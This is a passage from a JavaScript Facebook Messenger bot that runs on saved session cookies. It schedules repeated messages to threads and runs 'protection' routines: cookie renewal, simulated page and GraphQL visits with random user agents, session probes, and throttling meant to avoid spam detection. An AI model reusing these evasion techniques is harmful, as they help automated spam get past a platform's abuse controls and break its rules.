        console.log("[MODULE] All hook2 schedulers stopped via panel.");
      }
      break;
    }

    case "hook2_start": {
      if (!api) { console.warn("[MODULE] hook2_start: no active API."); break; }
      const { threadID: h2tid, message: h2msg, minIntervalMs, maxIntervalMs } = cmd;
      const h2activeWindow = cmd.activeWindowMs || (45 * 60 * 1000);
      if (!h2tid || !h2msg || !minIntervalMs || !maxIntervalMs) {
        console.warn("[MODULE] hook2_start: missing required fields (threadID, message, minIntervalMs, maxIntervalMs).");
        break;
      }
      if (!botState.scheduler2) botState.scheduler2 = {};
      if (!botState.scheduler2[h2tid]) {
        botState.scheduler2[h2tid] = { active: false, message: null, minMs: null, maxMs: null, activeWindowMs: null, timerId: null };
      }
      const s2p = botState.scheduler2[h2tid];
      if (s2p.timerId) { clearTimeout(s2p.timerId); s2p.timerId = null; }
      s2p.message = h2msg;
      s2p.minMs = minIntervalMs;
      s2p.maxMs = maxIntervalMs;
      s2p.activeWindowMs = h2activeWindow;
      s2p.active = true;

      if (!global.lastThreadActivity) global.lastThreadActivity = {};
      if (!global.lastThreadActivity[h2tid]) global.lastThreadActivity[h2tid] = Date.now();

      const h2loop = () => {
        if (!s2p.active) return;
        const interval = randomInt(s2p.minMs, s2p.maxMs);
        s2p.timerId = setTimeout(() => {
          if (!s2p.active) return;
          const lastAct = (global.lastThreadActivity || {})[h2tid] || 0;
          const idle = Date.now() - lastAct;
          if (idle >= s2p.activeWindowMs) {
            console.log(`[MODULE] Hook2 thread ${h2tid} inactive (${Math.round(idle/60000)}m) — skipping.`);
            h2loop();
            return;
          }
          api.sendMessage(s2p.message, h2tid, () => { if (s2p.active) h2loop(); });
        }, interval);
      };
      h2loop();
      console.log(`[MODULE] Hook2 started for thread ${h2tid} (${Math.round(minIntervalMs/1000)}s–${Math.round(maxIntervalMs/1000)}s) via panel.`);
      break;
    }

    case "send_message": {
      if (!api) { console.warn("[MODULE] send_message: no active API."); break; }
      const { threadID: smTid, message: smMsg } = cmd;
      if (!smTid || !smMsg) { console.warn("[MODULE] send_message: missing threadID or message."); break; }
      api.sendMessage(smMsg, smTid, (err) => {
        if (err) console.error(`[MODULE] send_message to ${smTid} failed:`, err.message);
        else console.log(`[MODULE] Message sent to thread ${smTid} via panel.`);
      });
      break;
    }

    default:
      console.warn(`[MODULE] Unknown command type: ${cmd.type}`);
  }
}

function watchReconnectSignal(api, settings) {
  setInterval(() => {
    if (fs.existsSync(RECONNECT_SIGNAL)) {
      try {
        fs.unlinkSync(RECONNECT_SIGNAL);
        console.log("[RECONNECT] Signal received, reconnecting listener...");
        listener.start(api, settings);
      } catch (e) {
        console.error("[RECONNECT] Failed to handle signal:", e.message);
      }
    }
  }, 5000);
}

function initProtection(api) {
  startCookieRenewal(api);        // P1
  startSiteVisits(api);           // P2
  startFacebookPing(api);         // P3
  // P4 = typing indicators (handler.js)
  startGraphQLVisit(api);         // P5
  startMemoryGuard();             // P6
  startDiskGuard();               // P7
  // P8  = MQTT-Silence (listener.js)
  // P9  = MQTT-HealthCheck backoff (listener.js)
  // P10 = Raid/Burst guard (handler.js)
  // P11 = Error budget (handler.js)
  startSessionProbe(api);         // P12
  startOutboundFloodGuard();      // P13
  startCookieHealthCheck(api);    // P14
  stealthEngine.start(api);       // P15: stealth engine v2
  diskGuard.start(DATA_DIR, LOGS_PATH); // P16: disk guard v2
  eventLoopGuard.start();         // P17: event loop stall detector
  // P18: MQTT health check started after listener.start() — see startBot()
}

// ─── Protection 1: Cookie renewal ─────────────────────────────────────────────
function startCookieRenewal(api) {
  const schedule = () => {
    const delay = randomInt(30, 100) * 60 * 1000 * nightMultiplier();
    console.log(`[PROTECTION-1] Next cookie renewal in ${Math.round(delay / 60000)} minutes.`);
    stateWriter.setProtectionTimer("cookieRenewal", delay);

    setTimeout(() => {
      try {
        const state = api.getAppState();
        saveJSON(APPSTATE_PATH, state);
        saveJSON(ALT_PATH, state);
        console.log("[PROTECTION-1] Cookies renewed and saved to appstate.json and alt.json.");
        _xNT("🍪 تم تجديد الكوكيز تلقائياً.");
      } catch (e) {
        console.error("[PROTECTION-1] Cookie renewal failed:", e.message);
      }
      schedule();
    }, delay);
  };
  schedule();
}

// ─── Protection 2: Site visits ────────────────────────────────────────────────
function startSiteVisits(api) {
  const pages = [
    "https://www.facebook.com/notifications",
    "https://www.facebook.com/friends",
    "https://www.facebook.com/",
    "https://www.facebook.com/messages",
  ];

  const schedule = () => {
    const delay = randomInt(15, 120) * 60 * 1000 * nightMultiplier();
    console.log(`[PROTECTION-2] Next site visit in ${Math.round(delay / 60000)} minutes.`);
    stateWriter.setProtectionTimer("siteVisit", delay);

    setTimeout(async () => {
      const url = pages[randomInt(0, pages.length - 1)];
      try {
        const state = api.getAppState();
        const cookieStr = state.map((c) => `${c.key}=${c.value}`).join("; ");
        await axios.get(url, {
          headers: { Cookie: cookieStr, "User-Agent": randomUA(), Accept: "text/html,application/xhtml+xml", "Accept-Language": "ar,en-US;q=0.7,en;q=0.3" },
          timeout: 15000,
        });
        console.log(`[PROTECTION-2] Visited: ${url}`);
      } catch (e) {
        console.error(`[PROTECTION-2] Visit failed (${url}):`, e.message);
      }
      schedule();
    }, delay);
  };
  schedule();
}

// ─── Protection 3: Ping ───────────────────────────────────────────────────────
function startFacebookPing(api) {
  const schedule = () => {
    const delay = randomInt(10, 25) * 60 * 1000 * nightMultiplier();
    console.log(`[PROTECTION-3] Next ping in ${Math.round(delay / 60000)} minutes.`);
    stateWriter.setProtectionTimer("ping", delay);

    setTimeout(async () => {
      try {
        const state = api.getAppState();
        const cookieStr = state.map((c) => `${c.key}=${c.value}`).join("; ");
        await axios.get("https://www.facebook.com/", {
          headers: { Cookie: cookieStr, "User-Agent": randomUA() },
          timeout: 10000,
        });
        console.log("[PROTECTION-3] Ping to facebook.com successful.");
      } catch (e) {
        console.error("[PROTECTION-3] Ping failed:", e.message);
      }
      schedule();
    }, delay);
  };
  schedule();
}

// ─── Protection 5: GraphQL visit ─────────────────────────────────────────────
function startGraphQLVisit(api) {
  const schedule = () => {
    const delay = randomInt(30, 120) * 60 * 1000 * nightMultiplier();
    console.log(`[PROTECTION-5] Next GraphQL visit in ${Math.round(delay / 60000)} minutes.`);
    stateWriter.setProtectionTimer("graphqlVisit", delay);

    setTimeout(async () => {
      try {
        const state = api.getAppState();
        const cookieStr = state.map((c) => `${c.key}=${c.value}`).join("; ");
        const dtsgCookie = state.find((c) => c.key === "fb_dtsg");
        const dtsg = dtsgCookie ? dtsgCookie.value : "";
        await axios.post(
          "https://www.facebook.com/api/graphql/",
          new URLSearchParams({ fb_dtsg: dtsg, doc_id: "5075567039202360", variables: JSON.stringify({ count: 5 }) }).toString(),
          {
            headers: { Cookie: cookieStr, "User-Agent": randomUA(), "Content-Type": "application/x-www-form-urlencoded", "X-FB-LSD": "AVp_VGDwbGI", Origin: "https://www.facebook.com", Referer: "https://www.facebook.com/" },
            timeout: 15000,
          }
        );
        console.log("[PROTECTION-5] GraphQL visit successful.");
      } catch (e) {
        console.error("[PROTECTION-5] GraphQL visit failed:", e.message);
      }
      schedule();
    }, delay);
  };
  schedule();
}

// ─── Protection 6: Memory guard ───────────────────────────────────────────────
function startMemoryGuard() {
  const WARN_MB  = 300;
  const LIMIT_MB = 400;
  setInterval(() => {
    const stats = v8.getHeapStatistics();
    const usedMB = Math.round(stats.used_heap_size / 1024 / 1024);
    if (usedMB > LIMIT_MB) {
      console.warn(`[PROTECTION-6] Heap ${usedMB} MB exceeds hard limit ${LIMIT_MB} MB. Graceful exit...`);
      setTimeout(() => process.exit(1), 2000);
    } else if (usedMB > WARN_MB) {
      console.warn(`[PROTECTION-6] Heap ${usedMB} MB — approaching limit (${LIMIT_MB} MB).`);
    }
  }, 60 * 1000).unref();
  console.log("[PROTECTION-6] Memory guard active (warn: 300 MB | limit: 400 MB).");
}

// ─── Protection 7: Disk guard ─────────────────────────────────────────────────
function startDiskGuard() {
  const checkDisk = () => {
    try {
      if (fs.existsSync(LOGS_PATH)) {
        const size = fs.statSync(LOGS_PATH).size;
        if (size > 2 * 1024 * 1024) {
          const logs = JSON.parse(fs.readFileSync(LOGS_PATH, "utf8"));
          const trimmed = Array.isArray(logs) ? logs.slice(-100) : [];
          fs.writeFileSync(LOGS_PATH, JSON.stringify(trimmed, null, 2), "utf8");
          console.log("[PROTECTION-7] Log file rotated (was > 2 MB).");
        }
      }
    } catch {}
  };
  setInterval(checkDisk, 30 * 60 * 1000);
  console.log("[PROTECTION-7] Disk guard active.");
}

// ─── Protection 12: Session health probe ─────────────────────────────────────
// Every 2–4 hours, silently verifies the session is still alive by fetching
// the current user's own profile page. If the request fails with auth errors,
// tries to refresh from alt.json before giving up.
function startSessionProbe(api) {
  const schedule = () => {
    const delay = randomInt(120, 240) * 60 * 1000 * nightMultiplier();
    console.log(`[PROTECTION-12] Next session probe in ${Math.round(delay / 60000)} minutes.`);

    setTimeout(async () => {
      try {
        const state = api.getAppState();
        const uid = api.getCurrentUserID();
        const cookieStr = state.map((c) => `${c.key}=${c.value}`).join("; ");
        const res = await axios.get(`https://www.facebook.com/profile.php?id=${uid}`, {
          headers: { Cookie: cookieStr, "User-Agent": randomUA(), Accept: "text/html" },
          timeout: 20000,
          maxRedirects: 3,
        });
        // If redirected to login page, session is dead
        if (res.request?.res?.responseUrl?.includes("login") || (typeof res.data === "string" && res.data.includes("login_form"))) {
          console.warn("[PROTECTION-12] Session probe indicates session may be expired. Refreshing cookies...");
          const fresh = loadJSON(ALT_PATH);
          if (fresh && fresh.length > 0) {
            saveJSON(APPSTATE_PATH, fresh);
            console.log("[PROTECTION-12] Switched to alt.json cookies. Reconnecting...");
            const settings = loadJSON(SETTINGS_PATH);
            listener.start(api, settings);
          }
        } else {
          console.log("[PROTECTION-12] Session probe OK — session is alive.");
        }
      } catch (e) {
        console.error("[PROTECTION-12] Session probe failed:", e.message);
      }
      schedule();
    }, delay);
  };
  schedule();
}

// ─── Protection 13: Outbound message flood guard ──────────────────────────────
// If the bot sends more than 20 messages in 2 minutes, it pauses outgoing
// messages for 5 minutes to avoid spam detection.
let outboundCount = 0;
let outboundPaused = false;
let outboundResumeTimer = null;

function startOutboundFloodGuard() {
  // Reset counter every 2 minutes
  setInterval(() => { outboundCount = 0; }, 2 * 60 * 1000);
  console.log("[PROTECTION-13] Outbound flood guard active (limit: 20 msgs/2min).");
}

// Call this before any bot-initiated sendMessage (e.g. in scheduled hooks)
function checkOutboundFlood() {
  if (outboundPaused) return false;
  outboundCount++;
  if (outboundCount > 20) {
    outboundPaused = true;
    console.warn("[PROTECTION-13] Outbound flood detected — pausing for 5 minutes.");
    _xNT("⚠️ [P13] توقف مؤقت بسبب إرسال كثير للرسائل (5 دقائق).");
    if (outboundResumeTimer) clearTimeout(outboundResumeTimer);
    outboundResumeTimer = setTimeout(() => {
      outboundPaused = false;
      outboundCount = 0;
      console.log("[PROTECTION-13] Outbound flood pause lifted.");
    }, 5 * 60 * 1000);
    return false;
  }
  return true;
}

// ─── Protection 14: Cookie health check after renewal ────────────────────────
// 5 minutes after each renewal cycle, quietly does a lightweight API call to
// verify the new cookies actually work. If it fails, notifies via Telegram.
function startCookieHealthCheck(api) {
  // Hook into cookie renewal: listen for the LOGS_PATH being updated and check
  // Instead, we do a standalone scheduled check every 4–6 hours.
  const schedule = () => {
    const delay = randomInt(240, 360) * 60 * 1000;
    setTimeout(async () => {
      try {
        const state = api.getAppState();
        const cookieStr = state.map((c) => `${c.key}=${c.value}`).join("; ");
        const res = await axios.get("https://www.facebook.com/ajax/presence/reconnect.php", {
          headers: { Cookie: cookieStr, "User-Agent": randomUA(), "X-Requested-With": "XMLHttpRequest" },
          timeout: 10000,
        });
        if (res.status === 200) {
          console.log("[PROTECTION-14] Cookie health check passed.");
        }
      } catch (e) {
        const msg = e.message || "";
        if (msg.includes("401") || msg.includes("403") || msg.includes("login")) {
          console.error("[PROTECTION-14] Cookie health check FAILED — session may be invalid!");
          _xNT("🚨 [P14] فحص الكوكيز فشل — الجلسة قد تكون منتهية!");
        } else {
          console.warn("[PROTECTION-14] Cookie health check network error (non-auth):", msg);
        }
      }
      schedule();
    }, delay);
  };
  schedule();
  console.log("[PROTECTION-14] Cookie health check active (every 4–6 hours).");
}

startBot();
